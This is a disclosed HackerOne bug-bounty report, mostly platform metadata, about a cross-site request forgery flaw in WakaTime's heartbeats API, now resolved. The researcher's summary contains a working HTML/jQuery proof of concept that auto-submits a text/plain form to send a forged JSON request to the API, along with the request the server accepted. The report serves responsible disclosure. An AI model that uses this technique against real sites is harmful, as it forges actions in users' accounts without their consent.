{
  "id": 245346,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDUzNDY=",
  "url": "https://hackerone.com/reports/245346",
  "title": "JSON CSRF on POST Heartbeats API",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2017-07-02T15:00:47.826Z",
  "submitted_at": "2017-07-02T15:00:47.826Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "sp1d3rs",
    "url": "/sp1d3rs",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/079/690/6853ada3e124bdd8616b1be752223b558de38195_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 21801,
    "url": "https://hackerone.com/wakatime",
    "handle": "wakatime",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/6t1wy3jbq9kayjwvqbnymavxizfx/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/6t1wy3jbq9kayjwvqbnymavxizfx/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "WakaTime",
      "twitter_handle": "wakatime",
      "website": "https://wakatime.com",
      "about": "Automated metrics about your programming from text editor plugins."
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "no-content",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2017-07-03T09:34:56.147Z",
  "bug_reporter_agreed_on_going_public_at": "2017-07-03T09:12:19.117Z",
  "team_member_agreed_on_going_public_at": "2017-07-03T09:34:56.113Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "",
  "weakness": {
    "id": 45,
    "name": "Cross-Site Request Forgery (CSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2017-08-02T09:12:19.163Z",
  "allow_singular_disclosure_after": -256825445.27386633,
  "singular_disclosure_allowed": true,
  "vote_count": 32,
  "voters": [
    "cxzer0",
    "loaymorad",
    "kurogai",
    "xsmyn",
    "bogdantc",
    "mirhat",
    "ras-it",
    "mohaned0101",
    "its_afolic",
    "dastan_9408",
    "and 22 more..."
  ],
  "severity": {
    "rating": "medium",
    "author_type": "User"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 4652,
      "category": "team",
      "content": "Thanks @sp1d3rs!",
      "updated_at": "2017-07-03T09:34:52.206Z",
      "can_view?": true,
      "can_create?": false,
      "attachments": [],
      "user": {
        "id": 175849,
        "username": "alanhamlett",
        "name": "Alan Hamlett",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": "https://wakatime.com",
        "location": "San Francisco, CA",
        "created_at": "2017-06-14T16:56:11.718Z",
        "url": "https://hackerone.com/alanhamlett",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/6l6usy1n2wl4kdtln91jre4g2d5n/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/6l6usy1n2wl4kdtln91jre4g2d5n/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c",
          "xtralarge": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6NTcyODIyMywicHVyIjoiYmxvYl9pZCJ9fQ==--3b225fa885fa6c2aa59c15f0bc094d1466b24517/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJwbmciLCJyZXNpemUiOiIyNjB4MjYwXHUwMDNlIn0sInB1ciI6InZhcmlhdGlvbiJ9fQ==--c155082ce6f9751dcb29cd6ea061a7e4d7329577/avatar.png"
        }
      }
    },
    {
      "id": 4651,
      "category": "researcher",
      "content": "WakaTime API used JSON for communications and supported cookie-based authentication/CSRF protection on https://api.wakatime.com. Usually, JSON is CSRF-safe, but only when requests with content-type other than application/json gets rejected or additional CSRF protection is in place (Authorization headers/API keys).\nIn another case, JSON CSRF can be achieved using the form with text/plain content-type, and well-formatted JSON request.\n\nUsed POC:\n```\n<html>\n<head>\n<script src=\"https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js\"></script>\n<script>\n$( document ).ready(function() {\n    $(\"#z\").attr(\"name\",'{\"entity\":\"https://zzz.com\",\"type\":\"domain\",\"time\":\"'+($.now()/1000)+'\",\"project\":\"<<LAST_PROJECT>>\",\"is_debugging\":false,\"plugin\":\"chrome-wakatime/1.0.2\",\"fakeparam\":\"');\n    $(\"#f\").submit();\n});\n</script>\n</head>\n<body>\n<form id=\"f\" ENCTYPE=\"text/plain\" action=\"https://api.wakatime.com/api/v1/users/current/heartbeats\" method=\"post\">\n<input id=\"z\" type=\"hidden\" name='test' value='test\"}'> \n<input type=\"submit\" value=\"send\">\n</form>\n</body>\n</html>\n```\nIt led to correct request, which was accepted by the server:\n```\n{\n\"entity\":\"https://zzz.com\",\n\"type\":\"domain\",\n\"time\":\"1499073845.176\",\n\"project\":\"<<LAST_PROJECT>>\",\n\"is_debugging\":false,\n\"plugin\":\"chrome-wakatime/1.0.2\",\n\"fakeparam\":\"=test\"\n}\n```\n\nThe WakaTime team fixed the issue fast by implementing access to this endpoint with API key.\nP.S. fix was temporary reverted back (due to updating of some things), it is known by WakaTime team. ",
      "updated_at": "2018-02-25T15:36:28.407Z",
      "can_view?": true,
      "can_create?": false,
      "attachments": [],
      "user": {
        "id": 79690,
        "username": "sp1d3rs",
        "name": "Eugene Yakovchuk",
        "bio": "The world tried to catch me, but it couldn't.",
        "cleared": true,
        "verified": true,
        "website": "https://r1p.xyz",
        "location": "Canada",
        "created_at": "2016-05-23T03:07:23.595Z",
        "url": "https://hackerone.com/sp1d3rs",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/000/079/690/6853ada3e124bdd8616b1be752223b558de38195_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/079/690/6853ada3e124bdd8616b1be752223b558de38195_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c",
          "xtralarge": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6MTM0NzcsInB1ciI6ImJsb2JfaWQifX0=--c8bb3853d9462d00bf85e988a9d33579e71c0b82/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJwbmciLCJyZXNpemUiOiIyNjB4MjYwXHUwMDNlIn0sInB1ciI6InZhcmlhdGlvbiJ9fQ==--c155082ce6f9751dcb29cd6ea061a7e4d7329577/z.png"
        }
      }
    }
  ]
}
